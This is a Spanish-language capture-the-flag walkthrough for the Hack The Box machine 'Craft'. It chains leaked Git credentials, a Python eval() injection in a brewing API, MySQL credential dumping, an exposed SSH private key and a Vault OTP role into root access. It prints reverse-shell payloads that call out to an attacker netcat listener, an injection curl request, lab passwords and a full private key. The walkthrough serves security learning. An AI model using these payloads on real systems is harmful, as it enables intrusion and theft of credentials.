___
Tags: #Medium #craft
___
# Craft
## Información General

**- Dificultad:** Medium <br>
**- Sistema operativo:** Linux <br>
**- Fecha de resolución:** 12/08/2026 <br>
**- Enlace:** [Craft](https://app.hackthebox.com/machines/Craft) <br>

## Usuarios identificados

| Orden | Usuario      | Cómo interviene                                                                                                                                                                                                                  |
| ----- | ------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1     | **dinesh**   | Sus credenciales aparecen expuestas en el repositorio Git de Gogs. Se utilizan para autenticarse contra la API y obtener un JWT.                                                                                                 |
| 2     | **ebachman** | Usuario identificado en la BD y en la actividad pública de Gogs.                                                                                                                                                                 |
| 3     | **gilfoyle** | Sus credenciales se recuperan mediante la consulta SQL a la tabla `user`. Son las únicas que, según el documento, permiten acceso a Gogs; posteriormente se encuentra una clave SSH privada y se accede como `gilfoyle` por SSH. |

## Listado de Vulnerabilidades Identificadas

| #     | Vulnerabilidad                                                                   | Descripción                                                                                                                                                                                                         | Impacto                                                                                                                                                                                |
| ----- | -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **1** | **Credenciales expuestas en el código fuente / repositorio Git**                 | En un commit del repositorio se encuentran las credenciales de `dinesh`. El propio documento identifica el commit y muestra que las credenciales quedaron almacenadas dentro del código.                            | Permite obtener credenciales válidas de un usuario de la aplicación y autenticarse contra la API. Esto proporciona el punto de entrada para continuar la explotación.                  |
| **2** | **Ejecución remota de código (RCE) mediante `eval()`**                           | La API utiliza `eval()` sobre el parámetro `abv`, cuyo contenido procede directamente de la petición del usuario. Al no existir una sanitización adecuada, se puede introducir código Python arbitrario.            | **Crítico.** Permite ejecutar comandos arbitrarios en el servidor y obtener una shell en el entorno de la aplicación. Es el principal vector de compromiso inicial.                    |
| **3** | **Exposición de credenciales en la base de datos accesible desde la aplicación** | Aprovechando el acceso obtenido mediante RCE, se utiliza el script `dbtest.py` para realizar consultas contra MySQL. La tabla `user` contiene las credenciales de `dinesh`, `ebachman` y `gilfoyle`.                | Permite obtener credenciales adicionales y realizar movimiento lateral/vertical entre cuentas. En particular, las credenciales de `gilfoyle` permiten acceder a Gogs.                  |
| **4** | **Reutilización de credenciales entre servicios**                                | Las credenciales recuperadas de la base de datos son probadas contra otros servicios. El documento indica que las de `gilfoyle` permiten acceder a Gogs.                                                            | Permite pasar del compromiso de la aplicación/base de datos al acceso autenticado a otro servicio de la infraestructura, ampliando el alcance del compromiso.                          |
| **5** | **Exposición de clave privada SSH en repositorio**                               | Dentro del repositorio privado `craft-infra` se encuentra una clave privada OpenSSH. El documento muestra posteriormente su utilización para autenticarse mediante SSH como `gilfoyle`.                             | Permite obtener acceso directo por SSH como `gilfoyle`, consiguiendo una shell persistente fuera del contexto inicial de la aplicación.                                                |
| **6** | **Exposición de información sensible de Vault**                                  | Una vez como `gilfoyle`, se localiza `.vault-token`, la variable `VAULT_ADDR` y el binario `vault`. Además, el repositorio `craft-infra` contiene archivos de configuración y scripts relacionados con Vault.       | Expone información y mecanismos de autenticación relacionados con la infraestructura de secretos, proporcionando la información necesaria para continuar hacia el acceso privilegiado. |
| **7** | **Configuración insegura de Vault / mecanismo de acceso SSH a root**             | El script `secrets.sh` configura Vault para proporcionar acceso SSH mediante OTP. El documento identifica específicamente el rol `root_otp` y muestra que puede utilizarse para iniciar una sesión SSH como `root`. | **Crítico.** Permite pasar de la cuenta `gilfoyle` a **`root`**, obteniendo control total del sistema.                                                                                 |

## Reconocimiento

**HTB** nos proporciona la ip de la máquina objetivo **10.129.229.45**

### Ping

```
ping -c 1 <ip de 10.129.229.45
```

<p align="center">
<img src="images/ping.png" width="600" alt="Resultado de Nmap">
</p>

**Su ttl es 63. Por tanto, es Linux**

## Enumeración

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -Pn 10.129.229.45
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: About
|_http-server-header: nginx/1.15.8
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
| tls-alpn: 
|_  http/1.1
6022/tcp open  ssh      Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Open port | Service  | Version                                   |
| --------- | -------- | ----------------------------------------- |
| 22        | ssh      | OpenSSH 7.4p1 Debian 10+deb9u6            |
| 443       | ssl/http | nginx 1.15.8                              |
| 6022      | ssh      | Golang x/crypto/ssh server (protocol 2.0) |

Nombre del certificado TSL es **craft.htb**, se añadirá al archivo `/etc/hosts`

#### craft.htb - TCP 443

La página web pertenece a una empresa cervecera y devuelve la misma página tanto por dirección IP como por nombre de dominio. No hay mucha información disponible.

<p align="center">
<img src="images/Craft.png" width="600" alt="Resultado de Nmap">
</p>

```
Craft aspira a ser el mayor repositorio de cervezas artesanales estadounidenses accesible a través de REST. En el futuro, lanzaremos una aplicación móvil para interactuar con nuestra API REST pública, así como un proceso para enviar recetas, pero por ahora, ¡visita nuestra API!
```

Hay dos enlaces en la parte superior derecha que dirigen a nuevos subdominios: `https://api.craft.htb/api/` y `https://gogs.craft.htb/` . Agregaré cada uno de estos a mi archivo `hosts` .

#### Fuzzing web 

```
wfuzz -u "https://10.129.229.45" -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt  -H "Host: FUZZ.craft.htb" --hh 3779 --hc 400
```

<p align="center">
<img src="images/wffuz.png" width="600" alt="Resultado de Nmap">
</p>

Lo añadiré a mi perfil `/etc/hosts` :

> 10.129.229.45 craft.htb api.craft.htb gogs.craft.htb vault.craft.htb 

### Subdominio

#### api.craft.htb

<p align="center">
<img src="images/apicraft.png" width="600" alt="Resultado de Nmap">
</p>

Esta página contiene una interfaz gráfica (GUI) para la API de la empresa.

Enlace como este `https://api.craft.htb/api/auth/login` nos permite introducir credenciales. Cuando tengamos volveremos aquí

#### vault.craft.htb

Al visitar la página, simplemente se muestra un error 404.

#### gogs.craft.htb

Explorando la página nos encontramos un repositorio con el nombre **Craft/craft-api**

<p align="center">
<img src="images/repo-Craft.png" width="600" alt="Resultado de Nmap">
</p>

En primer lugar me centraré en los asuntos (Issues) tanto abierto como cerradas.

##### Issues - open

<p align="center">
<img src="images/issues-open.png" width="600" alt="Resultado de Nmap">
</p>

```
#2 Valores de ABV falsos

Dinesh Chugtai comentó --> Es posible agregar valores de ABV falsos a la base de datos. Por ejemplo, una cerveza con 15.0 ABV... ¿podemos agregar una verificación para asegurarnos de que el ABV sea correcto antes de escribir en la base de datos?
```

Este ejemplo de consulta es útil porque muestra cómo incluir el token de autenticación en un comando " `curl` ":
5
```
curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
```

```
Erlich Bachman comentó --> ¿Puedes hacerlo tú mismo y confirmarlo? Lo probaré más tarde.

Dinesh Chugtai --> Claro, subiré una corrección en breve...

Dinesh Chugtai --> La corrección está activa y parece funcionar :)
```

```
c414b16057
```

```
Bertram Gilfoyle --> Arreglé el esquema de la base de datos, así que esto ya no es un problema. ¿Podemos eliminar esa lamentable excusa de "parche" antes de que ocurra algo terrible?
```

**Fix --> c414b16057**

<p align="center">
<img src="images/fix for bogus abv values.png" width="600" alt="Resultado de Nmap">
</p>

**¿Qué intentó hacer el programador?**

El objetivo de la función es validar el campo `abv` (graduación alcohólica) antes de guardar una nueva cerveza en el sistema.

- **Formato esperado:** El sistema espera que el ABV venga expresado como un número decimal entre 0 y 1 (donde `0.05` equivale al 5% de alcohol, `0.10` al 10%, etc.). Un valor de `1.0` sería alcohol puro (100%).

- **El problema que intenta corregir:** Si alguien envía un valor mayor a 1 (por ejemplo, `5` pensando en un 5% o un número absurdo como `500`), la validación detiene la petición devolviendo un error `400 Bad Request` con el mensaje:

    > _"ABV must be a decimal value less than 1.0"_

```python
# Comentario: "Asegurarse de que el valor de ABV sea coherente"
# make sure the ABV value is sane.

if eval('%s > 1' % request.json['abv']):
    return "ABV must be a decimal value less than 1.0", 400
else:
    create_brew(request.json)
    return None, 201
```

- Toma el valor de `request.json['abv']`.
- Evalúa si es mayor que `1`.
- Si es mayor a 1, rechaza la petición.
- Si es 1 o menor, crea el registro de la cerveza (`create_brew`) y responde con código `201 Created`.

**El peligro oculto: Inyección de código (RCE)**

Aunque la intención era buena, el programador cometió un **error gravísimo de seguridad** al usar la función `eval()` de Python:

```python
eval('%s > 1' % request.json['abv'])
```

`eval()` ejecuta cualquier cadena de texto entrante como si fuera código vivo de Python. Como el campo `abv` viene directamente del usuario sin limpiar (sanitizar), un atacante podría enviar código malicioso en ese parámetro en lugar de un número y **ejecutar comandos remotos en el servidor** (_Remote Code Execution_).

##### Issues - closed

<p align="center">
<img src="images/Addauthentication.png" width="600" alt="Resultado de Nmap">
</p>

```
#1 Agregar autenticación a la API de Brew

Bertram Gilfoyle comentó --> Por favor, agreguen autenticación a los puntos finales /api/brew, al menos para las acciones que pueden modificar la base de datos.

Erlich Bachman comentó --> Hecho. Ver commit: 4fd8dbf842
```

Intentando visualizar el commit me da error 404 :(

##### Users - Public Activity

###### ebachman

A continuación enseño todos los movimientos que realizó el usuario **ebachman** 

<p align="center">
<img src="images/brachman.png" width="600" alt="Resultado de Nmap">
</p>

Lo único destacable que hizo fue un script que comprueba **si la aplicación se puede conectar correctamente a la base de datos MySQL**.

<p align="center">
<img src="images/comprobacionbbddmysql.png" width="600" alt="Resultado de Nmap">
</p>

###### Dinesh

A continuación enseño todos los movimientos que realizó el usuario **Dinesh**.

<p align="center">
<img src="images/dinesh activity.png" width="600" alt="Resultado de Nmap">
</p>

Podemos destacar un commint que realizó:

**10e3ba4f0a** :

<p align="center">
<img src="images/commint123.png" width="600" alt="Resultado de Nmap">
</p>

En este commint se cuela las credenciales del usuario (**dinesh**:**4aUh0A8PbVJxgd**)

##### Repositorio:

###### dbtest.py

Su **única funcionalidad** es realizar una prueba básica de conectividad a la base de datos MySQL.

<p align="center">
<img src="images/dbtest.png" width="600" alt="Resultado de Nmap">
</p>

###### app.py

Su funcionalidad es **configurar, estructurar y poner en marcha el servidor de la API REST**

<p align="center">
<img src="images/app.png" width="600" alt="Resultado de Nmap">
</p>

###### .gitignore

Este archivo tiene oculto todos los archivos **.pyc** y **settings.py**

<p align="center">
<img src="images/gitignore.png" width="600" alt="Resultado de Nmap">
</p>

###### test.py

Este script es prácticamente **el mismo script de prueba de API** que vimos en una de las imágenes anteriores, pero con una diferencia importante: **le han quitado las credenciales del login** (ahora `auth=('', '')` está vacío).

En esencia, es un **script de prueba automatizada (test)** que realiza el flujo completo de autenticación y creación de datos en la API (`api.craft.htb`).

<p align="center">
<img src="images/testpy.png" width="600" alt="Resultado de Nmap">
</p>

**NOTA**: Este script suele utilizarse como base para **explotar la vulnerabilidad de RCE** que vimos en la primera imagen. Como sabemos que la API pasa el campo `'abv'` directamente por un `eval()`, este script es perfecto para modificar la línea `brew_dict['abv']` e inyectar código Python para conseguir una _Reverse Shell_ en el servidor.

###### models.py

Este archivo **`models.py`** define la **estructura de la base de datos** utilizando el ORM **Flask-SQLAlchemy**.

Su única funcionalidad es **mapear las tablas de la base de datos MySQL a clases de Python**, para que la aplicación pueda leer y guardar datos como objetos sin necesidad de escribir SQL manual.

<p align="center">
<img src="images/models.png" width="600" alt="Resultado de Nmap">
</p>

###### restplus.py

Este archivo **`restplus.py`** se encarga de **configurar la extensión Flask-RESTPlus** (utilizada para construir la API y generar su documentación automática en Swagger) y de **gestionar los errores globales**.

<p align="center">
<img src="images/restplus.png" width="600" alt="Resultado de Nmap">
</p>

###### endpoints/auth.py

Este archivo (**`endpoints/auth.py`**) es el encargado de gestionar la **autenticación basada en JWT** (_JSON Web Tokens_) para la API.

<p align="center">
<img src="images/authpy.png" width="600" alt="Resultado de Nmap">
</p>

## Explotación

### Shell como root@api Container 

#### Interacción con la API

Necesito poder interactuar con la API. Primero, intentaré iniciar sesión con las credenciales de Dinesh. Utilizaré el ejemplo que se encuentra en la página de la API y trataré de ejecutarlo. `https://api.craft.htb/api/auth/login` cred --> (**dinesh**:**4aUh0A8PbVJxgd**)

Obtengo el siguiente token:

```
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzg2NTE3ODcxfQ.d8dhoukegXYR6veJloQXl6_IB452mB_18ADYd6PgCSs"
```

#### Explicación de la explotación de la función `eval()` en python

La función `eval()` **no distingue entre "una expresión matemática" y "código Python arbitrario"**. Para el intérprete, todo es código válido que hay que ejecutar.

 **¿Por qué funciona el RCE?**

Python tiene una librería estándar (`os`) que permite ejecutar comandos del sistema operativo:

```python
import os
os.system("whoami")
```

Como dentro de `eval()` puedes escribir **cualquier expresión Python válida**, para conseguir **rce** usamos **mkfifo** de [revshells](https://www.revshells.com)

```python
__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|powershell -i 2>&1|nc 10.10.14.188 4443 >/tmp/f")
```

#### POC

Guardo el token en la variable Token:

```
TOKEN=$(curl -s -k -X GET "https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login" -H "accept: application/json" | jq -r '.token')
```

Valido si el token guardado es válido.

```
curl -k "https://api.craft.htb/api/auth/check" -H "accept: application/json" -H "X-Craft-API-Token: $TOKEN"
```

> {"message":"Token is valid!"}

Ahora que el token es válido lanzamos el comando que nos da RCE al sistema.

```
curl -k -X POST "https://api.craft.htb/api/brew/" \                                  -H "accept: application/json" \
  -H "Content-Type: application/json" \
  -H "X-Craft-API-Token: $TOKEN" \
  -d '{"id":0,"brewer":"dani","name":"beer","style":"bad","abv":"__import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.188 4443 >/tmp/f\")"}'
```

Antes de lanzar el comando, preparamos el puerto de escucha:

```
nc -lnvp 4443
```

<p align="center">
<img src="images/shell como root.png" width="600" alt="Resultado de Nmap">
</p>

### Shell como gilfoyle@craft

Una vez dentro me encuentro con el siguiente script llamado **dbtest.py** el mismo que me encontré en **gogs**. La idea es modificar este script para que aceptes **consultas** en la bbdd usando python

```python
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
```

Por tanto, el nuevo script quedaría:

```python
#!/usr/bin/env python

import pymysql
import sys                              
from craft_api import settings
                                   
# test connection to mysql database
                                                               
connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,        
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,         
                             cursorclass=pymysql.cursors.DictCursor)
    
try:                                   
    with connection.cursor() as cursor:                                 
        sql = sys.argv[1]
        cursor.execute(sql)       
        result = cursor.fetchall()
        print(result)
        
finally:              
    connection.close()
```

El nuevo script tendremos que rehacerlo en mi maquina, luego traspasarlo a la maquina objetivo ya que el contenedor no tiene instalado ni **nano** ni **vim**
#### Enumeración 

Devuelve la cuenta de usuario de la base de datos MySQL con la que estás conectado actualmente y la IP desde la que te conectas

```
python .dbtest.py  'SELECT user()'
```

> [{'user()': 'craft@172.20.0.6'}]

Lista **todas las bases de datos** existentes en el servidor MySQL

```
python .dbtest.py  "SELECT schema_name FROM information_schema.schemata;"
```

> [{'SCHEMA_NAME': 'information_schema'}, {'SCHEMA_NAME': 'craft'}]

Muestra **las tablas de la aplicación** ignorando las tablas por defecto del sistema

```
python .dbtest.py  "SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"
```

> [{'TABLE_SCHEMA': 'craft', 'TABLE_NAME': 'brew'}, {'TABLE_SCHEMA': 'craft', 'TABLE_NAME': 'user'}]

Muestra **todos los datos registrados** en la tabla de usuarios (`user`)

```
python .dbtest.py  "SELECT * from user"
```

> [{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]

Credenciales:

- **dinesh**:**4aUh0A8PbVJxgd**
- **ebachman**:**llJ77D8QFkLPQB**
- **gilfoyle**:**ZEU3N8WNM2rh4T**

#### Gogs

La única credencial que me dio resultado fue **gilfoyle**:**ZEU3N8WNM2rh4T**. Una vez dentro descubro un repo privado:

<p align="center">
<img src="images/repoprivado.png" width="600" alt="Resultado de Nmap">
</p>

Dentro me encuentro un **idrsa**:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z
F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS
zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS
RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx
lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw
pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ
B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi
4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq
Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ
3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K
Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV
ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU
GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5
0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F
5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE
cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5
elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf
CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa
hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB
a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg
MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W
Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS
Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW
I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
6YvpJhnN2SfJC/QftzqZK2MndJrmQ=
-----END OPENSSH PRIVATE KEY-----
```

Lo guardo en mi máquina y le doy permiso de usuario `chmod 600 id_rsa`. **Importante** si lo copias desde el repo, el idrsa se copiará con tabulaciones, tenlo en cuenta que sino, no conseguirás loguearte al ssh

```
ssh -i id_rsa gilfoyle@10.129.229.45
```

<p align="center">
<img src="images/user.txt.png" width="600" alt="Resultado de Nmap">
</p>

## Escalada de Privilegios

### Shell como root@craft

#### Enumeracion

Listando archivo ocultos me encuentro **.vault-token** 

<p align="center">
<img src="images/vaulttoken.png" width="600" alt="Resultado de Nmap">
</p>

En la variable entorno, existe un valor de la más interesante `VAULT_ADDR`

<p align="center">
<img src="images/env.png" width="600" alt="Resultado de Nmap">
</p>

También existe el binario **vault**

<p align="center">
<img src="images/vault.png" width="600" alt="Resultado de Nmap">
</p>

Todo esto está relacionado con el Proyecto Vault, un sistema que afirma:

> Proteja, almacene y controle de forma segura el acceso a tokens, contraseñas, certificados y claves de cifrado para proteger información confidencial y otros datos sensibles, utilizando una interfaz de usuario, una interfaz de línea de comandos o una API HTTP.

#### Enumeracion Gogs

Dentro del repositorio privado de Gogs `craft-infra` dentro de la carpeta " `vault` ". Contiene tres archivos:

<p align="center">
<img src="images/vault-1.png" width="600" alt="Resultado de Nmap">
</p>

**config.hcl**

Este archivo es el **fichero de configuración principal de HashiCorp Vault** (un gestor de contraseñas, claves, tokens y certificados muy popular en infraestructuras y servidores).

En palabras sencillas, le dice a Vault **dónde guardar sus datos**, **si mostrar o no interfaz gráfica** y **por qué puerto y puerto seguro debe recibir las peticiones**.

<p align="center">
<img src="images/config.png" width="600" alt="Resultado de Nmap">
</p>

**secrets.sh**

Este es un **script de Bash** para configurar **HashiCorp Vault** como un gestor de acceso SSH seguro mediante **OTP** (_One-Time Passwords_ o contraseñas de un solo uso).

En palabras sencillas, configura Vault para que actúe como un "generador de tokens temporales" para conectarse por SSH al usuario `root`.

<p align="center">
<img src="images/secretsssd.png" width="600" alt="Resultado de Nmap">
</p>

Este último script es clave para escalar a root. una vez que entiendes su funcionamiento.

#### SSH

```
vault ssh -role root_otp root@127.0.0.1
```

<p align="center">
<img src="images/sshrole.png" width="600" alt="Resultado de Nmap">
</p>

La pass lo encontraras justo al iniciar la sesión ssh y dentro encontraras la flag de **root.txt**

<p align="center">
<img src="images/root.txt.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusión

La máquina **Craft** es un sistema Linux de dificultad media cuya explotación se basa principalmente en una cadena de vulnerabilidades relacionadas con la aplicación web, la exposición de credenciales y una configuración insegura de Vault.

El punto de entrada se obtiene mediante las credenciales de **Dinesh**, expuestas en el repositorio de Gogs. Con estas credenciales es posible autenticarse contra la API y aprovechar una vulnerabilidad de **RCE causada por el uso inseguro de** `**eval()**` **sobre el parámetro** `**abv**`, consiguiendo ejecución de comandos en el entorno de la aplicación.  
Una vez conseguido el acceso, se puede consultar la base de datos MySQL y obtener las credenciales de los usuarios **dinesh, ebachman y gilfoyle**. Las credenciales de **gilfoyle** permiten acceder a Gogs, donde se encuentra un repositorio privado que contiene una **clave privada SSH**, posibilitando el acceso al sistema como `gilfoyle`.  
Finalmente, desde la cuenta `gilfoyle` se identifican elementos relacionados con **HashiCorp Vault**, incluyendo su configuración y scripts. El script `secrets.sh` configura un mecanismo de acceso SSH mediante OTP y permite utilizar el rol `root_otp`, consiguiendo finalmente una sesión como **root**.

En conclusión:

**Credenciales expuestas → RCE mediante** `**eval()**` **→ acceso a MySQL → extracción de credenciales → acceso a Gogs como** `**gilfoyle**` **→ clave SSH expuesta →** `**gilfoyle**` **→ Vault →** `**root**`**.**
